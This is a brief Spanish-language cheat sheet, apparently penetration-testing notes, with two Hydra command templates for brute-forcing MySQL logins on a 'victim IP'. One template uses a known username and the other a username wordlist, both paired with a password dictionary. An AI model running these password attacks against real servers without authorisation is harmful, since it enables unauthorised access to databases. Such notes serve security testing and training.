# HYDRA
## Conociendo usuario
```bash
hydra -l <"Usuario"> -P <"Diccionario de contraseñas"> mysql://<"IP VICTIMA">
```

## Usuario Desconocido
```bash
hydra -L <"Diccionario de usuarios"> -P <"Diccionario de contraseñas"> mysql://<"IP VICTIMA">
```